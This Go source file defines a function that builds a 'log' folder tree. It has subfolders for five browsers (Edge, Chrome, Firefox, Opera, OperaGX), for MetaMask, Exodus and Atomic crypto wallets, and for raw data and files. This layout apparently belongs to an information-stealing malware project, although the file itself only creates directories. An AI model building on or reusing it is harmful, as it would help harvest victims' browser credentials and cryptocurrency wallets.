package utils

import (
	"os"
	"path"
)

func CreateStructure(logFolderPath string) {
	if _, err := os.Stat(logFolderPath); !os.IsNotExist(err) {
		panic("already exists")
	}

	if _, err := os.Stat(logFolderPath); os.IsNotExist(err) {
		err := os.Mkdir(logFolderPath, 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Edge")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Edge"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Chrome")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Chrome"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Firefox")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Firefox"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "Opera")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers", "Opera"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "browsers", "OperaGX")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "browsers", "OperaGX"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "metamask_chrome")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets", "metamask_chrome"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "metamask_edge")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets", "metamask_edge"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "Exodus")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets", "Exodus"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "wallets", "Atomic")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "wallets", "Atomic"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "raw")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "raw"), 0644)
		if err != nil {
			panic(err)
		}
	}

	if _, err := os.Stat(path.Join(logFolderPath, "files")); os.IsNotExist(err) {
		err := os.Mkdir(path.Join(logFolderPath, "files"), 0644)
		if err != nil {
			panic(err)
		}
	}

}
